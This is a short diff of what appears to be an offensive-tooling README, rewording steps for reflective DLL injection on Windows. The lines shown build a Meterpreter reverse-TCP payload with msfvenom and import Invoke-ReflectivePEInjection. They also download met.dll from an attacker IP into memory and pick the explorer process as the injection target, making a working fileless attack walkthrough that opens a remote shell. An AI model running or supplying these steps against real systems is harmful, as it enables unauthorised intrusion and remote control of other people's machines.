@@ -19,14 +19,14 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork
 ```
 
 
-2. Upload the _Invoke-ReflectivePEInjection.ps1_ script in this repository to the target machine and import it from its location with `Import-Module`:
+2. Upload the _Invoke-ReflectivePEInjection.ps1_ script in this repository to the target machine and import it using `Import-Module`:
 ```powershell
 Import-Module .\Invoke-ReflectivePEInjection.ps1
 ```
 
 
-3. Load the DLL into a byte array and retrieve the `explorer` process ID.
-  (**NOTE:** _change the process based on your target environment, you can also load an executables (.exe) bytes into memory as well_):
+3. Load the DLL (or .exe) into a byte array and retrieve the `explorer` process ID.
+  (**NOTE:** _change the process based on your target environment_):
 ```powershell
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.191/met.dll')
 $procid = (Get-Process -Name explorer).Id
